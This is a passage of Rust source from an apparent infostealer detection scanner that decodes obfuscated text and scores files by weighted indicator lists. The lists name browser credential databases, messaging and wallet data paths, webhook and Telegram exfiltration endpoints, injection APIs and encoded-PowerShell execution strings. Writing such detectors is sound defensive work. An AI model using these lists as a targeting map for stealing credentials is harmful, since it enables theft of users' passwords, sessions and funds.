        .into_owned()
}

fn decode_u32(value: &str, radix: u32) -> String {
    u32::from_str_radix(value, radix)
        .ok()
        .and_then(char::from_u32)
        .map(|character| character.to_string())
        .unwrap_or_default()
}

fn normalize_obfuscation(text: &str) -> String {
    let mut out = HXXPS_RE.replace_all(text, "https://").into_owned();
    out = HXXP_RE.replace_all(&out, "http://").into_owned();
    out = DOT_OBF_RE.replace_all(&out, ".").into_owned();
    out = SLASH_OBF_RE.replace_all(&out, "/").into_owned();

    out.chars()
        .filter(|character| !matches!(character, '"' | '\'' | '`' | '+' | ' ' | '\t'))
        .collect()
}

fn normalize_aggressive_obfuscation(text: &str) -> String {
    let normalized = normalize_obfuscation(text);
    normalized
        .chars()
        .filter(|character| {
            character.is_ascii_alphanumeric()
                || matches!(
                    character,
                    ':' | '/' | '.' | '_' | '-' | '?' | '=' | '&' | '%' | '#'
                )
        })
        .collect()
}

fn rot13_text(text: &str) -> String {
    text.bytes()
        .map(|byte| match byte {
            b'a'..=b'z' => (((byte - b'a' + 13) % 26) + b'a') as char,
            b'A'..=b'Z' => (((byte - b'A' + 13) % 26) + b'A') as char,
            _ => byte as char,
        })
        .collect()
}

fn has_webhook_signal(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains("discord")
        || lower.contains("webhooks")
        || lower.contains("hxxp")
        || lower.contains("qvfpbeq")
        || lower.contains("jroubbxf")
        || lower.contains("uggc")
}

fn has_full_webhook(text: &str) -> bool {
    WEBHOOK_TEXT_RE.is_match(text)
}

fn printable_ratio(bytes: &[u8]) -> f64 {
    if bytes.is_empty() {
        return 0.0;
    }

    let printable = bytes
        .iter()
        .filter(|byte| byte.is_ascii_graphic() || matches!(byte, b' ' | b'\n' | b'\r' | b'\t'))
        .count();
    printable as f64 / bytes.len() as f64
}

fn shannon_entropy(bytes: &[u8]) -> f64 {
    if bytes.is_empty() {
        return 0.0;
    }

    let mut counts = [0usize; 256];
    for byte in bytes {
        counts[*byte as usize] += 1;
    }

    let len = bytes.len() as f64;
    counts
        .iter()
        .filter(|count| **count > 0)
        .map(|count| {
            let probability = *count as f64 / len;
            -probability * probability.log2()
        })
        .sum()
}

fn sample_printable_ratio(bytes: &[u8], limit: usize) -> f64 {
    printable_ratio(&bytes[..bytes.len().min(limit)])
}

fn assess_infostealer_bytes(path: &Path, bytes: &[u8], source: &str) -> ThreatAssessment {
    let mut threat = ThreatAssessment::default();
    let signals = detect_signals(bytes);
    let deep_text_path = source != "file" || is_deep_text_path(path);

    score_path_context(path, source, &mut threat);
    score_bytes(bytes, &mut threat);
    score_compiled_binary_window(path, bytes, &mut threat);

    if bytes.len() >= 4 && (deep_text_path || signals.text || signals.encoded || signals.utf16) {
        let text = String::from_utf8_lossy(bytes);
        score_threat_text(&text, &mut threat);
        score_amsi_if_interesting(path, text.as_bytes(), source, &mut threat);

        let decoded = decode_common_escapes(&text);
        if decoded != text {
            score_threat_text(&decoded, &mut threat);
            score_amsi_if_interesting(path, decoded.as_bytes(), source, &mut threat);
        }

        for joined in collect_string_fragment_runs(&decoded) {
            score_threat_text(&joined, &mut threat);
            score_numeric_byte_arrays(&joined, &mut threat);
            score_encoded_blobs(&joined, &mut threat);
            let normalized_joined = normalize_obfuscation(&joined);
            if normalized_joined != joined {
                score_threat_text(&normalized_joined, &mut threat);
                score_encoded_blobs(&normalized_joined, &mut threat);
            }
        }

        let normalized = normalize_obfuscation(&decoded);
        if normalized != decoded {
            score_threat_text(&normalized, &mut threat);
        }

        let aggressive = normalize_aggressive_obfuscation(&decoded);
        if aggressive != normalized
            && has_webhook_signal(&decoded)
            && !has_full_webhook(&decoded)
            && !has_full_webhook(&normalized)
        {
            score_threat_text(&aggressive, &mut threat);
        }

        score_numeric_byte_arrays(&decoded, &mut threat);

        let lower = decoded.to_ascii_lowercase();
        if contains_any(&lower, &["qvfpbeq", "jroubbxf", "uggc", "uggcf"]) {
            let rot13 = rot13_text(&decoded);
            score_threat_text(&rot13, &mut threat);
        }

        if signals.encoded || deep_text_path {
            score_encoded_blobs(&normalized, &mut threat);
        }
    }

    threat
}

fn score_path_context(path: &Path, source: &str, threat: &mut ThreatAssessment) {
    let path_text = path
        .display()
        .to_string()
        .replace('/', "\\")
        .to_ascii_lowercase();
    let file_name = path
        .file_name()
        .and_then(|value| value.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();

    if contains_any(
        &path_text,
        &[
            "\\user data\\default\\login data",
            "\\user data\\default\\network\\cookies",
            "\\user data\\default\\web data",
            "\\user data\\default\\local state",
            "\\firefox\\profiles\\",
            "\\profiles\\logins.json",
            "\\profiles\\key4.db",
            "\\profiles\\cookies.sqlite",
            "\\profiles\\formhistory.sqlite",
            "\\profiles\\places.sqlite",
        ],
    ) || ((path_text.contains("\\user data\\profile ")
        || path_text.contains("\\user data\\guest profile\\"))
        && contains_any(
            &file_name,
            &["login data", "cookies", "web data", "local state"],
        ))
    {
        add_threat(
            threat,
            24,
            "Path targets browser credential artifacts",
            CAT_BROWSER_STORE,
        );
    }

    if contains_any(
        &path_text,
        &[
            "\\discord\\local storage\\leveldb",
            "\\discordcanary\\local storage\\leveldb",
            "\\discordptb\\local storage\\leveldb",
            "\\discorddevelopment\\local storage\\leveldb",
            "\\discord\\local state",
            "\\discordcanary\\local state",
            "\\discordptb\\local state",
            "\\telegram desktop\\tdata",
            "\\tox\\",
            "\\pidgin\\",
            "\\element\\",
            "\\signal\\",
        ],
    ) {
        add_threat(
            threat,
            22,
            "Path targets messaging session artifacts",
            CAT_MESSAGING | CAT_DISCORD_TOKEN,
        );
    }

    if contains_any(
        &path_text,
        &[
            "\\metamask",
            "\\exodus",
            "\\electrum",
            "\\atomic",
            "\\ledger live",
            "\\monero",
            "\\wallets\\",
            "\\local extension settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",
            "\\local extension settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa",
            "\\local extension settings\\fhbohimaelbohpjbbldcngcnapndodjp",
            "\\indexeddb\\chrome-extension_",
        ],
    ) {
        add_threat(threat, 24, "Path targets wallet artifacts", CAT_WALLET);
    }

    if contains_any(
        &path_text,
        &[
            "\\filezilla\\sitemanager.xml",
            "\\filezilla\\recentservers.xml",
            "\\winscp.ini",
            "\\thunderbird\\profiles\\",
            "\\outlook\\",
            "\\openvpn\\config",
            "\\nordvpn\\",
            "\\protonvpn\\",
            "\\putty\\sessions",
        ],
    ) {
        add_threat(
            threat,
            20,
            "Path targets FTP, mail, VPN, or SSH client credentials",
            CAT_FTP_MAIL_VPN,
        );
    }

    if contains_any(
        &file_name,
        &[
            "passwords.txt",
            "password.txt",
            "cookies.txt",
            "autofills.txt",
            "creditcards.txt",
            "credit_cards.txt",
            "wallets.txt",
            "discord_tokens.txt",
            "tokens.txt",
            "browser_passwords.txt",
            "chrome_passwords.txt",
            "browser_cookies.txt",
            "telegram_sessions.zip",
            "session_tokens.txt",
            "system info.txt",
            "system_info.txt",
            "installed_apps.txt",
            "processes.txt",
            "screenshot.jpg",
            "screenshot.png",
        ],
    ) {
        add_threat(
            threat,
            if source == "archive" || source == "decompressed" {
                18
            } else {
                10
            },
            "Infostealer output/staging filename",
            CAT_STAGING,
        );
    }
}

fn score_encoded_blobs(text: &str, threat: &mut ThreatAssessment) {
    score_encoded_blobs_depth(text, threat, 0);
}

fn score_encoded_blobs_depth(text: &str, threat: &mut ThreatAssessment, depth: usize) {
    if depth > 2 {
        return;
    }

    for found in BASE64_RE.find_iter(text).take(128) {
        if let Some(decoded) = decode_base64_candidate(found.as_str()) {
            if decoded.len() <= 1024 * 1024 {
                let decoded_text = String::from_utf8_lossy(&decoded);
                score_threat_text(&decoded_text, threat);
                let normalized = normalize_obfuscation(&decode_common_escapes(&decoded_text));
                if normalized != decoded_text {
                    score_threat_text(&normalized, threat);
                }
                score_amsi_buffer("decoded-base64", &decoded, threat);
                if depth < 2 && ENCODED_SIGNAL_AC.is_match(decoded_text.as_bytes()) {
                    score_encoded_blobs_depth(&decoded_text, threat, depth + 1);
                }
            }
        }
    }

    for found in BASE32_RE.find_iter(text).take(96) {
        if let Some(decoded) = decode_base32_candidate(found.as_str()) {
            if decoded.len() <= 1024 * 1024 {
                let decoded_text = String::from_utf8_lossy(&decoded);
                score_threat_text(&decoded_text, threat);
                let normalized = normalize_obfuscation(&decode_common_escapes(&decoded_text));
                if normalized != decoded_text {
                    score_threat_text(&normalized, threat);
                }
                score_amsi_buffer("decoded-base32", &decoded, threat);
                if depth < 2 && ENCODED_SIGNAL_AC.is_match(decoded_text.as_bytes()) {
                    score_encoded_blobs_depth(&decoded_text, threat, depth + 1);
                }
            }
        }
    }

    for found in HEX_RE.find_iter(text).take(128) {
        if let Some(decoded) = decode_hex_candidate(found.as_str()) {
            let decoded_text = String::from_utf8_lossy(&decoded);
            score_threat_text(&decoded_text, threat);
            let normalized = normalize_obfuscation(&decode_common_escapes(&decoded_text));
            if normalized != decoded_text {
                score_threat_text(&normalized, threat);
            }
            score_amsi_buffer("decoded-hex", &decoded, threat);
            if depth < 2 && ENCODED_SIGNAL_AC.is_match(decoded_text.as_bytes()) {
                score_encoded_blobs_depth(&decoded_text, threat, depth + 1);
            }
        }
    }
}

fn score_numeric_byte_arrays(text: &str, threat: &mut ThreatAssessment) {
    for found in NUMERIC_BYTE_ARRAY_RE.find_iter(text).take(96) {
        let Some(decoded) = decode_numeric_byte_array(found.as_str()) else {
            continue;
        };
        let decoded_text = String::from_utf8_lossy(&decoded);
        score_threat_text(&decoded_text, threat);
        let normalized = normalize_obfuscation(&decode_common_escapes(&decoded_text));
        if normalized != decoded_text {
            score_threat_text(&normalized, threat);
        }
        score_amsi_buffer("decoded-byte-array", &decoded, threat);
    }
}

fn score_compiled_binary_window(path: &Path, bytes: &[u8], threat: &mut ThreatAssessment) {
    if bytes.len() < 64 || !(is_compiled_binary_path(path) || is_pe_bytes(bytes)) {
        return;
    }

    let lower = String::from_utf8_lossy(bytes).to_ascii_lowercase();
    if has_benign_terminal_context(&lower) {
        add_threat(
            threat,
            0,
            "Terminal application context",
            CAT_BENIGN_TERMINAL,
        );
    }

    score_stealer_family_text(&lower, threat);
    if shannon_entropy(&bytes[..bytes.len().min(2 * 1024 * 1024)]) >= 7.25 {
        add_threat(
            threat,
            6,
            "High-entropy packed or encrypted binary content",
            CAT_OBFUSCATION,
        );
    }

    if contains_any(
        &lower,
        &[
            "winhttpsendrequest",
            "httpsendrequest",
            "internetopenurl",
            "internetconnect",
            "urldownloadtofile",
            "system.net.http",
            "httpclient",
            "webrequest",
            "uploadfile",
            "uploadvalues",
            "curl_easy_perform",
            "winhttpreaddata",
            "internetwritefile",
            "libcurl",
            "smtpclient",
            "ftpwebrequest",
        ],
    ) {
        add_threat(threat, 14, "Compiled HTTP/network exfil APIs", CAT_EXFIL);
    }

    if has_telegram_c2(&lower)
        || contains_any(
            &lower,
            &[
                "dropboxapi.com/2/files/upload",
                "slack.com/api/files.upload",
                "discord.com/api/webhooks",
                "discordapp.com/api/webhooks",
                "webhook.site",
                "api.telegram.org/bot",
            ],
        )
    {
        add_threat(
            threat,
            18,
            "Compiled stealer-style C2 or exfil service",
            CAT_EXFIL,
        );
    }

    if contains_any(
        &lower,
        &[
            "cryptunprotectdata",
            "ncryptunprotectsecret",
            "protecteddata.unprotect",
            "dpapi",
        ],
    ) {
        add_threat(
            threat,
            24,
            "Compiled credential decryption APIs",
            CAT_DECRYPT,
        );
    }

    if contains_any(
        &lower,
        &[
            "aesmanaged",
            "aesgcm",
            "rijndaelmanaged",
            "cryptostream",
            "cryptdecrypt",
            "bcryptdecrypt",
            "cryptacquirecontext",
            "chacha20",
            "salsa20",
            "rc4",
            "decryptstring",
            "xor_key",
            "xor key",
        ],
    ) {
        add_threat(
            threat,
            7,
            "Compiled encryption or string-decryption indicators",
            CAT_OBFUSCATION,
        );
    }

    if contains_any(
        &lower,
        &[
            "getprocaddress",
            "loadlibrary",
            "virtualalloc",
            "virtualprotect",
            "writeprocessmemory",
            "createremotethread",
            "ntunmapviewofsection",
            "queueuserapc",
            "setthreadcontext",
        ],
    ) {
        add_threat(
            threat,
            8,
            "Compiled loader or injection primitives",
            CAT_OBFUSCATION | CAT_ANTI_ANALYSIS,
        );
    }

    if has_browser_credential_artifact_context(&lower) {
        add_threat(
            threat,
            32,
            "Compiled browser credential store targeting",
            CAT_BROWSER_STORE,
        );
    }

    if has_payment_artifact_context(&lower) {
        add_threat(
            threat,
            18,
            "Compiled browser payment or autofill targeting",
            CAT_PAYMENT_AUTOFILL | CAT_BROWSER_STORE,
        );
    }

    if contains_any(
        &lower,
        &[
            "discord\\local storage\\leveldb",
            "discord/local storage/leveldb",
            "discordcanary\\local storage\\leveldb",
            "discordcanary/local storage/leveldb",
            "discordptb\\local storage\\leveldb",
            "discordptb/local storage/leveldb",
            "discorddevelopment\\local storage\\leveldb",
            "discorddevelopment/local storage/leveldb",
            "discord\\local state",
            "discord/local state",
            "discord token",
            "token_regex",
            "discord_desktop_core",
        ],
    ) || has_discord_token_with_context(&lower)
    {
        add_threat(
            threat,
            26,
            "Compiled Discord token targeting",
            CAT_DISCORD_TOKEN,
        );
    }

    if contains_any(
        &lower,
        &[
            "telegram desktop\\tdata",
            "telegram desktop\\tdata",
            "telegram desktop/tdata",
            "key_datas",
            "d877f783d5d3ef8c",
            "telegram sessions",
            "tox_save",
            "pidgin\\accounts.xml",
            "signal\\config.json",
        ],
    ) {
        add_threat(
            threat,
            20,
            "Compiled messaging session targeting",
            CAT_MESSAGING,
        );
    }

    if has_wallet_artifact_context(&lower) {
        add_threat(threat, 22, "Compiled crypto wallet targeting", CAT_WALLET);
    }

    if has_password_manager_context(&lower) {
        add_threat(
            threat,
            18,
            "Compiled password manager targeting",
            CAT_PASSWORD_MANAGER,
        );
    }

    if contains_any(
        &lower,
        &[
            "filezilla",
            "sitemanager.xml",
            "recentservers.xml",
            "winscp.ini",
            "wcx_ftp.ini",
            "thunderbird\\profiles",
            "openvpn",
            "nordvpn",
            "putty\\sessions",
        ],
    ) {
        add_threat(
            threat,
            18,
            "Compiled FTP, mail, VPN, or SSH credential targeting",
            CAT_FTP_MAIL_VPN,
        );
    }

    if contains_any(
        &lower,
        &[
            "getclipboarddata",
            "get-clipboard",
            "getforegroundwindow",
            "bitblt",
            "printwindow",
            "globalmemorystatusex",
            "getcomputername",
            "enumdisplaydevices",
            "getadaptersinfo",
            "getvolumeinformation",
            "getasynckeystate",
            "setwindowshookex",
            "getkeystate",
        ],
    ) {
        add_threat(threat, 7, "Compiled host collection APIs", CAT_RECON);
    }

    if contains_any(
        &lower,
        &[
            "getasynckeystate",
            "setwindowshookex",
            "wh_keyboard_ll",
            "keyboard hook",
            "keylogger",
        ],
    ) {
        add_threat(
            threat,
            18,
            "Compiled keylogging or input-capture indicators",
            CAT_INPUT_CAPTURE | CAT_KEY_MATERIAL,
        );
    }

    if has_staging_artifact_context(&lower) {
        add_threat(
            threat,
            14,
            "Compiled collected-data staging behavior",
            CAT_STAGING,
        );
    }

    if contains_any(
        &lower,
        &[
            "currentversion\\run",
            "schtasks",
            "taskscheduler",
            "startup\\programs\\startup",
            "regcreatekey",
            "regsetvalue",
        ],
    ) {
        add_threat(
            threat,
            10,
            "Compiled persistence indicators",
            CAT_PERSISTENCE,
        );
    }

    if contains_any(
        &lower,
        &[
            "pyinstaller",
            "pyarmor",
            "autoit",
            "upx0",
            "upx1",
            "themida",
            "confuserex",
            "costura",
            "isdebuggerpresent",
            "checkremotedebuggerpresent",
            "virtualbox",
            "vboxservice",
            "vmware",
            "sandboxie",
            "procmon",
            "wireshark",
            "fiddler",
            "ida64",
            "x64dbg",
        ],
    ) {
        add_threat(
            threat,
            8,
            "Packed or compiled obfuscation indicators",
            CAT_OBFUSCATION | CAT_ANTI_ANALYSIS,
        );
    }

    score_utf16_compiled_window(bytes, threat);
}

fn score_utf16_compiled_window(bytes: &[u8], threat: &mut ThreatAssessment) {
    let sample = &bytes[..bytes.len().min(4 * 1024 * 1024)];
    for offset in 0..=1 {
        if sample.len().saturating_sub(offset) < 16 {
            continue;
        }

        let usable_len = sample.len().saturating_sub(offset) & !1;
        let units = sample[offset..offset + usable_len]
            .chunks_exact(2)
            .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
            .collect::<Vec<u16>>();
        let text = String::from_utf16_lossy(&units);
        if contains_any(
            &text.to_ascii_lowercase(),
            &[
                "discord",
                "webhooks",
                "login data",
                "local state",
                "cryptunprotectdata",
                "os_crypt",
                "metamask",
                "telegram desktop",
                "filezilla",
                "bitwarden",
                "local extension settings",
                "api.telegram.org/bot",
            ],
        ) {
            score_threat_text(&text, threat);
        }
    }
}

fn is_compiled_binary_path(path: &Path) -> bool {
    let Some(extension) = path.extension().and_then(|value| value.to_str()) else {
        return false;
    };

    matches!(
        extension.to_ascii_lowercase().as_str(),
        "exe" | "dll" | "scr" | "sys" | "ocx" | "cpl" | "com" | "pyd"
    )
}

fn is_pe_bytes(bytes: &[u8]) -> bool {
    if bytes.len() < 0x40 || &bytes[..2] != b"MZ" {
        return false;
    }

    let pe_offset =
        u32::from_le_bytes([bytes[0x3c], bytes[0x3d], bytes[0x3e], bytes[0x3f]]) as usize;
    pe_offset
        .checked_add(4)
        .is_some_and(|end| end <= bytes.len())
        && &bytes[pe_offset..pe_offset + 4] == b"PE\0\0"
}

fn score_bytes(bytes: &[u8], threat: &mut ThreatAssessment) {
    if WEBHOOK_BYTES_RE.is_match(bytes) {
        add_threat(
            threat,
            35,
            "Discord webhook endpoint",
            CAT_WEBHOOK | CAT_EXFIL,
        );
    }
}

fn score_threat_text(text: &str, threat: &mut ThreatAssessment) {
    let lower = text.to_ascii_lowercase();

    if has_remediation_context(&lower) {
        add_threat(
            threat,
            0,
            "Defensive remediation or cleanup context",
            CAT_REMEDIATION,
        );
    }

    score_stealer_family_text(&lower, threat);

    if contains_any(
        &lower,
        &[
            "discord.com/api/webhooks",
            "discordapp.com/api/webhooks",
            "/api/webhooks/",
        ],
    ) {
        add_threat(
            threat,
            35,
            "Webhook exfiltration endpoint",
            CAT_WEBHOOK | CAT_EXFIL,
        );
    }

    if contains_any(
        &lower,
        &[
            "requests.post(",
            "httpx.post(",
            "aiohttp.clientsession",
            "axios.post(",
            "$http.post(",
            "webclient.upload",
            "uploadfile",
            "uploadvalues",
            "uploadstring",
            "files.upload",
            "smtpclient",
            "ftpwebrequest",
            "senddocument",
            "multipart/form-data",
            "content-disposition",
            "formdata",
        ],
    ) || (lower.contains("fetch(") && lower.contains("method") && lower.contains("post"))
        || (lower.contains("curl ") && lower.contains(" -f ") && has_webhook_signal(&lower))
    {
        add_threat(threat, 14, "HTTP upload/post behavior", CAT_EXFIL);
    }

    if has_telegram_c2(&lower)
        || contains_any(
            &lower,
            &[
                "dropboxapi.com/2/files/upload",
                "slack.com/api/files.upload",
                "discord.com/api/webhooks",
                "discordapp.com/api/webhooks",
                "webhook.site",
                "api.telegram.org/bot",
            ],
        )
    {
        add_threat(threat, 18, "Stealer-style C2 or exfil service", CAT_EXFIL);
    }

    let browser_store_specific = has_browser_credential_artifact_context(&lower)
        || (lower.contains("login data")
            && contains_any(
                &lower,
                &[
                    "local state",
                    "chrome",
                    "chromium",
                    "edge",
                    "brave",
                    "opera",
                ],
            ));
    if browser_store_specific {
        add_threat(
            threat,
            30,
            "Browser credential store targeting",
            CAT_BROWSER_STORE,
        );
    }

    if has_payment_artifact_context(&lower) {
        add_threat(
            threat,
            18,
            "Browser payment or autofill targeting",
            CAT_PAYMENT_AUTOFILL | CAT_BROWSER_STORE,
        );
    }

    if contains_any(&lower, &["cryptunprotectdata", "os_crypt", "encrypted_key"])
        || (lower.contains("dpapi") && browser_store_specific)
        || contains_any(
            &lower,
            &[
                "select origin_url",
                "select host_key",
                "select username_value",
                "select encrypted_value",
                "select action_url",
                "from logins",
                "from cookies",
            ],
        )
    {
        add_threat(
            threat,
            22,
            "Credential decryption or browser database access",
            CAT_DECRYPT,
        );
    }

    if has_discord_token_with_context(&lower) {
        add_threat(
            threat,
            24,
            "Discord token pattern",
            CAT_DISCORD_TOKEN | CAT_KEY_MATERIAL,
        );
    }

    if has_discord_token_harvesting_context(&lower) {
        add_threat(
            threat,
            24,
            "Discord token harvesting indicators",
            CAT_DISCORD_TOKEN,
        );
    }

    if contains_any(
        &lower,
        &[
            "telegram desktop\\\\tdata",
            "telegram desktop/tdata",
            "key_datas",
            "map0",
            "d877f783d5d3ef8c",
            "telegram sessions",
            "session.default",
            "discord_desktop_core",
            "tox_save",
            "pidgin\\\\accounts.xml",
            "signal\\\\config.json",
        ],
    ) {
        add_threat(threat, 20, "Messaging session targeting", CAT_MESSAGING);
    }

    if has_wallet_artifact_context(&lower) {
        add_threat(threat, 22, "Crypto wallet targeting", CAT_WALLET);
    }

    if has_password_manager_context(&lower) {
        add_threat(
            threat,
            18,
            "Password manager targeting",
            CAT_PASSWORD_MANAGER,
        );
    }

    if contains_any(
        &lower,
        &[
            "filezilla",
            "sitemanager.xml",
            "recentservers.xml",
            "winscp.ini",
            "wcx_ftp.ini",
            "total commander",
            "coreftp",
            "putty\\\\sessions",
            "thunderbird\\\\profiles",
            "outlook.office",
            "openvpn",
            "nordvpn",
            "protonvpn",
            "wireguard",
        ],
    ) {
        add_threat(
            threat,
            18,
            "FTP, mail, VPN, or SSH credential targeting",
            CAT_FTP_MAIL_VPN,
        );
    }

    if contains_any(
        &lower,
        &[
            "get-clipboard",
            "clipboard.get",
            "getclipboarddata",
            "screenshot",
            "getforegroundwindow",
            "platform.uname",
            "wmic ",
            "systeminfo",
            "getcomputername",
            "globalmemorystatusex",
            "enumdisplaydevices",
            "getadaptersinfo",
            "getvolumeinformation",
        ],
    ) {
        add_threat(
            threat,
            6,
            "Host reconnaissance or collection behavior",
            CAT_RECON,
        );
    }

    if contains_any(
        &lower,
        &[
            "getasynckeystate",
            "setwindowshookex",
            "wh_keyboard_ll",
            "pynput.keyboard",
            "keyboard.on_press",
            "keyboard hook",
            "keylogger",
        ],
    ) {
        add_threat(
            threat,
            18,
            "Keylogging or input-capture indicators",
            CAT_INPUT_CAPTURE | CAT_KEY_MATERIAL,
        );
    }

    if has_staging_artifact_context(&lower) {
        add_threat(
            threat,
            14,
            "Collected-data staging or archive behavior",
            CAT_STAGING,
        );
    }

    if contains_any(
        &lower,
        &[
            "currentversion\\\\run",
            "currentversion/run",
            "schtasks",
            "taskscheduler",
            "startup\\\\programs\\\\startup",
            "wscript.shell",
            "reg add",
            "__eventfilter",
            "commandlineeventconsumer",
            "__filtertoconsumerbinding",
        ],
    ) {
        add_threat(threat, 10, "Persistence indicators", CAT_PERSISTENCE);
    }

    if contains_any(
        &lower,
        &[
            "aesmanaged",
            "aes.create",
            "crypto.cipher.aes",
            "cryptography.fernet",
            "aesgcm",
            "rijndaelmanaged",
            "cryptostream",
            "cryptdecrypt",
            "bcryptdecrypt",
            "chacha20",
            "salsa20",
            "rc4",
            "decryptstring",
            "xor_key",
            "xor key",
        ],
    ) {
        add_threat(
            threat,
            7,
            "Encryption or string-decryption indicators",
            CAT_OBFUSCATION,
        );
    }

    if contains_any(
        &lower,
        &[
            "getprocaddress",
            "loadlibrary",
            "virtualalloc",
            "virtualprotect",
            "writeprocessmemory",
            "createremotethread",
            "ntunmapviewofsection",
            "queueuserapc",
            "setthreadcontext",
        ],
    ) {
        add_threat(
            threat,
            8,
            "Loader or injection primitives",
            CAT_OBFUSCATION | CAT_ANTI_ANALYSIS,
        );
    }

    if contains_any(
        &lower,
        &[
            "isdebuggerpresent",
            "checkremotedebuggerpresent",
            "virtualbox",
            "vboxservice",
            "vmware",
            "sandboxie",
            "procmon",
            "wireshark",
            "fiddler",
            "ida64",
            "x64dbg",
            "processhacker",
            "gettickcount",
            "queryperformancecounter",
            "screen.width",
            "screen.height",
        ],
    ) {
        add_threat(
            threat,
            8,
            "Anti-analysis or sandbox-evasion indicators",
            CAT_ANTI_ANALYSIS,
        );
    }

    if contains_any(
        &lower,
        &[
            "powershell -enc",
            "powershell.exe -enc",
            "-encodedcommand",
            "certutil -decode",
            "certutil.exe -decode",
            "mshta ",
            "rundll32 ",
            "regsvr32 ",
            "bitsadmin /transfer",
            "invoke-webrequest",
            "invoke-restmethod",
            "iwr ",
            "irm ",
            "frombase64string",
            "base64.b64decode",
            "urlsafe_b64decode",
            "gzip.decompress",
            "zlib.decompress",
            "marshal.loads",
            "exec(base64",
            "eval(atob",
            "invoke-expression",
            "fromcharcode",
            "atob(",
            "string.fromcharcode",
        ],
    ) {
        add_threat(
            threat,
            8,
            "Obfuscated execution indicators",
            CAT_OBFUSCATION,
        );
    }
}

fn score_stealer_family_text(lower: &str, threat: &mut ThreatAssessment) {
    if has_stealer_family_context(lower) {
        add_threat(
            threat,
            16,
            "Known infostealer family or builder reference",
            CAT_STEALER_FAMILY,
        );
    }
}

fn has_stealer_family_context(lower: &str) -> bool {
    contains_any(
        lower,
        &[
            "lumma stealer",
            "lumma c2",
            "lumma grabber",
            "vidar stealer",
            "redline stealer",
            "raccoon stealer",
            "stealc stealer",
            "stealc c2",
            "rhadamanthys",
            "mystic stealer",
            "ghost stealer",
            "solyximmortal",
            "agent tesla",
            "azorult stealer",
            "arkei stealer",
            "meta stealer",
            "metastealer",
            "snake keylogger",
            "nova stealer",
            "katz stealer",
            "pupkinstealer",
            "blueline stealer",
            "santastealer",
        ],
    )
}

fn has_browser_credential_artifact_context(lower: &str) -> bool {
    contains_any(
        lower,
        &[
            "user data\\default\\login data",
            "user data/default/login data",
            "user data\\default\\network\\cookies",
            "user data/default/network/cookies",
            "user data\\guest profile\\login data",
            "user data/guest profile/login data",
            "network\\cookies",
            "network/cookies",
            "logins.json",
            "key4.db",
            "cookies.sqlite",
            "formhistory.sqlite",
            "places.sqlite",
            "local extension settings\\",
            "local extension settings/",
            "sync extension settings\\",
            "sync extension settings/",
            "indexeddb\\chrome-extension_",
            "indexeddb/chrome-extension_",
            "select origin_url",
            "select host_key",
            "select username_value",
            "from logins",
            "from cookies",
        ],
    ) || (lower.contains("login data")
        && contains_any(
            lower,
            &[
                "local state",
                "os_crypt",
                "encrypted_key",
                "cryptunprotectdata",
                "user data\\profile ",
                "user data/profile ",
            ],
        ))
}

fn has_payment_artifact_context(lower: &str) -> bool {
    contains_any(
        lower,
        &[
            "select name_on_card",
            "select card_number_encrypted",
            "from credit_cards",
            "card_number_encrypted",
            "payment_methods",
        ],
    ) || (lower.contains("web data")
        && contains_any(lower, &["credit_cards", "autofill", "name_on_card"]))
}

fn has_wallet_artifact_context(lower: &str) -> bool {
    contains_any(
        lower,
        &[
            "wallet.dat",
            "\\metamask",
            "/metamask",
            "local extension settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",
            "local extension settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
            "local extension settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa",
            "local extension settings/bfnaelmomeimhlpmgjnjophhpkkoljpa",
            "local extension settings\\fhbohimaelbohpjbbldcngcnapndodjp",
            "local extension settings/fhbohimaelbohpjbbldcngcnapndodjp",
            "nkbihfbeogaeaoehlefnkodbefgpgknn",
            "bfnaelmomeimhlpmgjnjophhpkkoljpa",
            "fhbohimaelbohpjbbldcngcnapndodjp",
            "acmacodkjbdgmoleebolmdjonilkdbch",
            "mcohilncbfahbmgdjkbpemcciiolgcge",
            "fnjhmkhhmkbjkkabndcnnogagogbneec",
            "hnfanknocfeofbddgcijnmhnfnkdnaad",
            "ibnejdfjmmkpcnlpebklmnkoeoihofec",
            "egjidjbpglichdcondbcbdnbeeppgdph",
            "exodus\\exodus.wallet",
            "exodus/exodus.wallet",
            "electrum\\wallets",
            "electrum/wallets",
            "atomic\\local storage",
            "atomic/local storage",
            "ledger live",
            "phantom\\local storage",
            "phantom/local storage",
        ],
    ) || (contains_any(
        lower,
        &[
            "metamask",
            "exodus",
            "electrum",
            "atomic wallet",
            "coinbase wallet",
            "ronin wallet",
            "binance wallet",
            "trust wallet",
            "tronlink",
            "keplr",
            "solflare",
        ],
    ) && contains_any(
        lower,
        &["wallet", "seed phrase", "private key", "extension"],
    ))
}

fn has_password_manager_context(lower: &str) -> bool {
    contains_any(
        lower,
        &[
            "1password",
            "bitwarden",
            "lastpass",
            "keepass",
            "keepassxc",
            "dashlane",
            "nordpass",
            "roboform",
            "proton pass",
        ],
    ) && contains_any(
        lower,
        &[
            "password",
            "vault",
            "extension",
            "login",
            "credential",
            "database",
        ],
    )
}

fn has_staging_artifact_context(lower: &str) -> bool {
    contains_any(
        lower,
        &[
            "passwords.txt",
            "all passwords.txt",
            "cookies.txt",
            "all cookies.txt",
            "autofills.txt",
            "creditcards.txt",
            "credit_cards.txt",
            "discord_tokens",
            "wallets.txt",
            "browser_passwords.txt",
            "chrome_passwords.txt",
            "browser_cookies.txt",
            "telegram_sessions.zip",
            "session_tokens.txt",
            "system info.txt",
            "system_info.txt",
            "installed_apps.txt",
            "processes.txt",
        ],
    ) || (contains_any(lower, &["logs.zip", "grabbed.zip", "stealer.zip"])
        && contains_any(lower, &["password", "cookie", "wallet", "discord"]))
}

fn has_telegram_c2(lower: &str) -> bool {
    lower.contains("api.telegram.org/bot")
        || (lower.contains("telegram")
            && (lower.contains("senddocument")
                || lower.contains("sendmessage")
                || TELEGRAM_BOT_RE.is_match(lower)))
}

fn has_discord_token_with_context(lower: &str) -> bool {
    DISCORD_TOKEN_RE.find_iter(lower).any(|candidate| {
        let value = candidate.as_str();
        if value.starts_with("mfa.") {
            return true;
        }

        let nearby = context_window(lower, candidate.start(), candidate.end(), 384);
        contains_any(
            nearby,
            &[
                "discord",
                "discordapp",
                "discordcanary",
                "discordptb",
